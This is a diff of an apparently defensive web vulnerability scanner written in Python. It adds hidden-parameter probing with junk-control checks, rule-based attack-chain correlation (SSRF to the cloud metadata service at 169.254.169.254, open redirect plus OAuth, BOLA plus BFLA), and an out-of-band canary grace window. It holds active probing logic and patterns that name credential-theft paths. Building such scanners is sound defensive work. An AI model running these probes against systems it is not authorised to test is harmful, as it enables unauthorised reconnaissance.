+    penanda jinak unik per scan. Hasil TIDAK dihubungkan ke
+    param_targets (keputusan D2)."""
+    surf = ctx.surface(full=True)
+    endpoints = _hidden_endpoints(ctx, surf)
+    if not endpoints:
+        return
+    marker = ctx.marker
+    req_state = {"n": 0}
+
+    def _get(url, extra):
+        # extra: list of (name, value). URL unik per probe agar cache
+        # klien tidak menyajikan respons basi untuk verifikasi ulang.
+        if extra:
+            sep = "&" if "?" in url else "?"
+            qs = "&".join(f"{k}={quote(v, safe='')}" for k, v in extra)
+            url = url + sep + qs
+        req_state["n"] += 1
+        return ctx.client.get(url)
+
+    for ep in endpoints:
+        if ctx.cancelled():
+            return
+        req_state["n"] = 0
+        base_path = ep.split("?")[0]
+
+        def _value(idx):
+            return f"ptk{marker}{idx}"
+
+        # Baseline ganda: request kedua memakai nama sampah unik — bila
+        # responsnya saja sudah berbeda, endpoint tidak stabil/reflektif.
+        b1 = _get(ep, [])
+        b2 = _get(ep, [(f"ptkst{marker}", _value(900))])
+        base_body = b1.body or ""
+        if similarity(base_body, b2.body or "") <= 0.80:
+            ctx.L(f"  [hidden] {base_path}: baseline not stable — skipped")
+            continue
+        # Kontrol sampah wajib: satu batch 12 nama acak.
+        junk = [(f"ptkjunk{marker}{i}", _value(950 + i)) for i in range(12)]
+        ctrl = _get(ep, junk)
+        ctrl_body = ctrl.body or ""
+        if _hidden_differs(ctrl, base_body):
+            ctx.L(f"  [hidden] {base_path}: junk control changed the response — endpoint reflects arbitrary parameters, skipped")
+            continue
+
+        found = {}
+
+        def _probe(names, depth):
+            """Kembalikan nama-nama dalam `names` yang terbukti mengubah
+            respons. Rekursi bisect (kedalaman daun tunggal untuk batch
+            12 adalah 5; cap 6 hanya pengaman), anggaran per endpoint
+            dibatasi keras."""
+            if not names or depth > 6 or ctx.cancelled() or req_state["n"] > 48:
+                return []
+            resp = _get(ep, [(n, _value(abs(hash((n, depth))) % 10000))
+                             for n in names])
+            if not _hidden_differs(resp, base_body):
+                return []
+            if len(names) == 1:
+                return list(names)
+            mid = len(names) // 2
+            return (_probe(names[:mid], depth + 1)
+                    + _probe(names[mid:], depth + 1))
+
+        batches = [HIDDEN_PARAM_WORDLIST[i:i + 12]
+                   for i in range(0, len(HIDDEN_PARAM_WORDLIST), 12)]
+        candidates = []
+        for bi, batch in enumerate(batches):
+            if ctx.cancelled() or req_state["n"] > 48:
+                break
+            resp = _get(ep, [(n, _value(bi * 100 + j))
+                             for j, n in enumerate(batch)])
+            if _hidden_differs(resp, base_body):
+                candidates.extend(_probe(batch, 1))
+        # Verifikasi per nama terisolasi: 2x request NILAI BARU, keduanya
+        # harus berbeda dari baseline DAN dari kontrol sampah.
+        verified = []
+        for n in candidates:
+            if ctx.cancelled() or req_state["n"] > 48:
+                break
+            if n in found:
+                continue
+            ok = True
+            for k in range(2):
+                r = _get(ep, [(n, _value(5000 + k * 131 + len(n)))])
+                if not _hidden_differs(r, base_body) or \
+                        not _hidden_differs(r, ctrl_body):
+                    ok = False
+                    break
+            if ok:
+                found[n] = True
+                verified.append(n)
+        if verified:
+            names_txt = ", ".join(
+                f"{n} ({HIDDEN_PARAM_CATEGORY.get(n, 'miscellaneous')})"
+                for n in verified)
+            add(F("LOW", f"Hidden parameters accepted: {base_path}",
+                  f"The endpoint changes its response for {len(verified)} undocumented parameter(s) that are not linked from the crawled interface: {names_txt}. A hidden parameter is attack surface, not a proven vulnerability: it is a starting point for follow-up injection/IDOR testing, not evidence of one.",
+                  evidence=f"verified differential response for: {', '.join(verified)} (junk control had no effect)",
+                  cwe="CWE-235", owasp="A05:2021 Security Misconfiguration",
+                  cvss=2.0,
+                  remed='Review whether each hidden parameter is intentional; remove or protect debug/preview/data-view parameters in production and document the accepted parameter set.',
+                  confidence="probable", location=base_path,
+                  param=", ".join(verified)))
+            ctx.L(f"  [hidden] {base_path}: {len(verified)} hidden parameters verified ({req_state['n']} requests)")
+
+
+# --------------------------------------- WS7 (v1.8.0): chaining
+
+def _chain_pool(findings, *subs):
+    return [f for f in findings
+            if f.get("confidence") in ("probable", "confirmed")
+            and any(s in (f.get("title") or "").lower() for s in subs)]
+
+
+def _chain_other(pool, exclude):
+    for f in pool:
+        if f is not exclude:
+            return f
+    return None
+
+
+def _chain_candidates(findings):
+    """WS7 (v1.8.0, decision K1): rule-based correlation over ONE
+    scan's findings. A chain candidate requires at least TWO distinct
+    component findings, EVERY component at probable or better; the
+    candidate itself is capped at probable — correlation is not
+    verification of the combined path. No impact score is invented:
+    the candidate inherits the strongest component severity (capped
+    at HIGH) and lists its components with their locations so a
+    human can judge the path. Returns chain dicts."""
+    out = []
+
+    def emit(rule, title, comps, steps, impact, remed):
+        comps = [c for c in comps if c]
+        ids = {id(c) for c in comps}
+        if len(comps) < 2 or len(ids) < 2:
+            return
+        if any(c.get("confidence") not in ("probable", "confirmed")
+               for c in comps):
+            return
+        sev = max((c.get("severity", "INFO") for c in comps),
+                  key=lambda s: SEV_ORDER.get(s, 0))
+        if SEV_ORDER.get(sev, 0) > SEV_ORDER["HIGH"]:
+            sev = "HIGH"
+        out.append({
+            "rule": rule, "title": title, "severity": sev,
+            "cvss": max(c.get("cvss", 0) or 0 for c in comps),
+            "location": comps[0].get("location", ""),
+            "components": [{"title": c.get("title", ""),
+                            "location": c.get("location", ""),
+                            "confidence": c.get("confidence", "")}
+                           for c in comps],
+            "steps": steps, "impact": impact, "remediation": remed})
+
+    ssrf = _chain_pool(findings, "ssrf")
+    if ssrf:
+        meta = _chain_other(
+            _chain_pool(findings, "cloud metadata", "169.254.169.254"),
+            ssrf[0])
+        if meta:
+            emit("ssrf-cloud-metadata",
+                 "SSRF can reach the cloud metadata service",
+                 [ssrf[0], meta],
+                 [f"Component: {ssrf[0]['title']} [{ssrf[0]['confidence']}]",
+                  f"Component: {meta['title']} [{meta['confidence']}]",
+                  "Prerequisite: the SSRF can address the link-local "
+                  "metadata endpoint from the server's network position",
+                  "Impact: instance credentials (IAM role tokens) are "
+                  "readable, turning a request-forgery bug into cloud "
+                  "account access"],
+                 "A server-side request forgery that can reach the "
+                 "cloud metadata endpoint exposes temporary cloud "
+                 "credentials for the instance role.",
+                 "Block link-local/metadata egress from the "
+                 "application (IMDSv2 + egress allowlist); remove "
+                 "over-privileged instance roles.")
+        svc = _chain_other(
+            _chain_pool(findings, "docker api", "kubernetes",
+                        "elasticsearch", "kubelet", "internal service"),
+            ssrf[0])
+        if svc:
+            emit("ssrf-internal-service",
+                 "SSRF can reach an internal service API",
+                 [ssrf[0], svc],
+                 [f"Component: {ssrf[0]['title']} [{ssrf[0]['confidence']}]",
+                  f"Component: {svc['title']} [{svc['confidence']}]",
+                  "Prerequisite: the internal API trusts requests "
+                  "originating from the application's network position",
+                  "Impact: the internal control/data plane becomes "
+                  "reachable from the internet through the SSRF"],
+                 "An SSRF combined with an unauthenticated internal "
+                 "service API gives an external attacker a path into "
+                 "the internal control plane.",
+                 "Authenticate internal service APIs; restrict the "
+                 "application's egress to required destinations.")
+    redir = _chain_pool(findings, "open redirect")
+    oauth = _chain_pool(findings, "oauth state", "oauth redirect_uri")
+    if redir and oauth:
+        emit("open-redirect-oauth",
+             "Open redirect assists OAuth code/token theft",
+             [redir[0], oauth[0]],
+             [f"Component: {redir[0]['title']} [{redir[0]['confidence']}]",
+              f"Component: {oauth[0]['title']} [{oauth[0]['confidence']}]",
+              "Prerequisite: the OAuth flow's redirect handling "
+              "accepts or can be chained through the open redirector",
+              "Impact: authorization codes/tokens are delivered to "
+              "an attacker-controlled origin (account takeover)"],
+             "An open redirect on the same trust surface as a weakly "
+             "validated OAuth flow turns code interception into "
+             "account takeover.",
+             "Remove open redirects on authentication surfaces; "
+             "enforce exact redirect_uri matching and state.")
+    bola = _chain_pool(findings, "bola", "idor")
+    bfla = _chain_pool(findings, "bfla",
+                       "privileged function accessible",
+                       "privileged function reachable")
+    if bola and bfla:
+        emit("bola-bfla",
+             "Object-level and function-level authorization both fail",
+             [bola[0], bfla[0]],
+             [f"Component: {bola[0]['title']} [{bola[0]['confidence']}]",
+              f"Component: {bfla[0]['title']} [{bfla[0]['confidence']}]",
+              "Prerequisite: a low-privilege account exists (the "
+              "precondition both component checks already exercised)",
+              "Impact: a low-privilege user can both read other "
+              "users' objects and invoke privileged functions — "
+              "full application compromise short of the host"],
+             "Simultaneous BOLA and BFLA failure means authorization "
+             "is missing at both the object and the function layer; "
+             "low-privilege accounts can operate as administrators.",
+             "Centralize server-side authorization: per-object "
+             "ownership AND per-function role checks on every route.")
+    upload = _chain_pool(findings, "upload validation bypass",
+                         "file upload without authentication")
+    xss = _chain_pool(findings, "stored xss")
+    if upload and xss:
+        emit("upload-stored-xss",
+             "Upload bypass plus stored XSS surface",
+             [upload[0], xss[0]],
+             [f"Component: {upload[0]['title']} [{upload[0]['confidence']}]",
+              f"Component: {xss[0]['title']} [{xss[0]['confidence']}]",
+              "Prerequisite: uploaded content is served from an "
+              "origin trusted by the application session",
+              "Impact: attacker content executes in victims' "
+              "browsers under the application's origin (session "
+              "actions as the victim)"],
+             "A validated upload-bypass path combined with a stored "
+             "XSS surface gives persistent in-origin script "
+             "execution delivered through the upload feature.",
+             "Serve uploads from a separate, cookieless origin with "
+             "Content-Disposition: attachment; keep output encoding "
+             "on every rendered field.")
+    return out
+
+
 # ------------------------------------------------------------ runner
 
 _PASSIVE_BASE = ["c_version_disclosure", "c_tech_fingerprint", "c_security_headers",
                  "c_cookie_security", "c_cors", "c_tls"]
-_ACTIVE_BASE = ["c_waf_detection", "c_sensitive_files", "c_directory_listing",
+_ACTIVE_BASE = ["c_waf_detection", "c_sensitive_files", "c_dependency_versions", "c_directory_listing",
                 "c_admin_panels", "c_http_methods", "c_open_redirect", "c_csrf_forms",
                 "c_jwt_analysis", "c_api_exposure", "c_error_disclosure",
-                "c_js_libraries", "c_sri_and_session", "c_auth_surface",
+                "c_js_libraries", "c_sri_and_session", "c_tabnabbing", "c_auth_surface",
                 "c_upload_surface", "c_deserialization_surface",
                 "c_security_txt_robots", "c_api_sensitive_data"]
 _ADVANCED = ["c_host_header", "c_web_injection", "c_crlf_injection", "c_ssrf",
              "c_blind_oob",
              "c_jwt_forgery", "c_websocket_surface",
-             "c_broken_access_idor", "c_bola_matrix", "c_nosql_api", "c_json_fuzz",
-             "c_stored_xss", "c_prototype_pollution", "c_jwt_kid_injection", "c_graphql_deep", "c_dom_xss", "c_wp_plugins",
+             "c_broken_access_idor", "c_bola_matrix", "c_bfla_matrix", "c_nosql_api", "c_json_fuzz",
+             "c_stored_xss", "c_prototype_pollution", "c_jwt_kid_injection", "c_graphql_deep", "c_oauth_sso", "c_dom_xss", "c_wp_plugins",
              "c_source_disclosure", "c_session_fixation",
              "c_password_reset_poisoning", "c_cache_poisoning", "c_email_security",
-             "c_cve_candidates"]
+             "c_cve_candidates", "c_exposed_secrets", "c_git_secrets",
+             "c_hidden_params", "c_dns_axfr", "c_cloud_buckets"]
 PROFILES = {
     "passive-quick": ["c_version_disclosure", "c_security_headers", "c_tls"],
     "passive-full": _PASSIVE_BASE + ["c_email_security"],
@@ -3122,12 +6216,56 @@ def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=N
         finally:
             ctx._deadline = None
 
+    # ---- WS1 grace window: callbacks can arrive AFTER the planting
+    # check finished (slow fetchers, queued renders). Re-poll the
+    # registry once all checks are done, waiting out the remainder of
+    # the grace window since the last plant (bounded by the remaining
+    # total budget). The outcome — including an explicit 0 — is
+    # recorded in the scan's canary meta; silence is never dressed up
+    # as "not vulnerable".
+    canary_note = ""
+    if ctx.canary_configured and ctx._oob_planted and not aborted:
+        _wait = ctx.canary_grace_s - (time.time() - ctx._oob_last_plant_ts)
+        _remain = total_budget - (time.time() - t0)
+        _wait = max(0.0, min(_wait, _remain))
+        if _wait > 0 and not ctx.cancelled():
+            L(f"[oob] grace window: waiting {_wait:.0f}s for late callbacks "
+              f"({len(ctx._oob_planted)} tokens planted)")
+            _end = time.time() + _wait
+            while time.time() < _end and not ctx.cancelled():
+                time.sleep(min(1.0, _end - time.time()))
+        _late = _oob_sweep(ctx, add)
+        _st = ctx.canary_status()
+        if _st["callbacks_received"]:
+            canary_note = (f"{_st['callbacks_received']} callback(s) received "
+                           f"for {_st['tokens_hit']}/{_st['tokens_planted']} "
+                           f"planted tokens"
+                           + (f"; {_late} arrived during the grace window"
+                              if _late else ""))
+        else:
+            canary_note = (f"0 callbacks received within the "
+                           f"{ctx.canary_grace_s:.0f}s grace window — blind "
+                           "SSRF/XXE/CMDi/XSS variants are UNPROVEN (not "
+                           "evidence of absence)")
+        L(f"[oob] {canary_note}")
+    elif ctx.canary_configured:
+        canary_note = "canary configured; no blind injection points were planted"
+    else:
+        canary_note = ("canary not configured — blind out-of-band checks "
+                       "were not evaluated")
+    canary_result = ctx.canary_status(note=canary_note)
+
     # ---- verification pass: temuan exposure 'confirmed' diminta ulang sekali lagi;
     # yang tidak dapat direproduksi diturunkan ke probable (jujur, bukan dihapus).
+    # Location virtual (objek .git "/.git@<sha>:path", fragmen source-map
+    # "file.map#source") BUKAN URL sehingga tidak bisa diminta ulang —
+    # evidence-nya ditangkap saat walk/scan itu sendiri; lewati.
     downgraded = 0
     for f in findings:
         if f.get("confidence") == "confirmed" and 'exposed' in f["title"] \
-                and f.get("location", "").startswith("/"):
+                and f.get("location", "").startswith("/") \
+                and "@" not in f.get("location", "") \
+                and "#" not in f.get("location", ""):
             try:
                 chk = ctx.client.get(f["location"])
                 if chk.status != 200 or ctx.is_missing(chk):
@@ -3138,6 +6276,28 @@ def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=N
                 pass
     if downgraded:
         L(f"[verify] {downgraded} findings downgraded confirmed->probable (not reproduced)")
+    # ---- WS7 (v1.8.0): vulnerability chaining — rule-based
+    # correlation over this scan's findings (decision K1: chain
+    # candidates are capped at probable; components keep their own
+    # tiers and are always listed with the candidate).
+    chains = _chain_candidates(findings)
+    for ch in chains:
+        add(F(ch["severity"], f"Attack chain candidate: {ch['title']}",
+              "Rule-based correlation of findings from THIS scan — "
+              "the combined path was NOT exercised as a single "
+              "exploit; every component is listed with its own "
+              "evidence tier and the candidate is capped at probable "
+              "(decision K1). " + ch["impact"],
+              evidence=" | ".join(
+                  f"component: {c['title']} [{c['confidence']}] "
+                  f"@ {c['location']}" for c in ch["components"])
+              + " || steps: " + " -> ".join(ch["steps"]),
+              remed=ch["remediation"], cvss=ch["cvss"],
+              confidence="probable", location=ch["location"],
+              origin="correlation"))
+    if chains:
+        L(f"[chain] {len(chains)} attack-chain candidate(s) from "
+          "correlation rules")
     # ---- scan health: rasio blokir tinggi = hasil mungkin tertekan WAF/rate-limit
     warnings = []
     if aborted:
@@ -3146,6 +6306,8 @@ def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=N
                         "of health.")
     if headless_note:
         warnings.append(headless_note)
+    if canary_result["tokens_planted"] and not canary_result["callbacks_received"]:
+        warnings.append(canary_note + ".")
     st = ctx.client.stats
     if st.get("total", 0) >= 20 and st.get("blocked", 0) / max(1, st["total"]) > 0.2:
         warnings.append(f"{st['blocked']}/{st['total']} responses blocked (403/429) — scan results may be incomplete (WAF/rate-limit).")
@@ -3177,4 +6339,8 @@ def run_vulnscan(target, profile="active-deep", log=None, opts=None, cancelled=N
             "errors": errors, "duration_s": dur,
             "checks_run": ran, "checks_total": len(checks),
             "checks_detail": checks_detail,
+            "canary": canary_result,
+            "chains": chains,
+            "bfla_matrix": ctx.check_meta.get("bfla_matrix", []),
+            "meta": ctx.check_meta,
             "cancelled": bool(ctx.cancelled())}
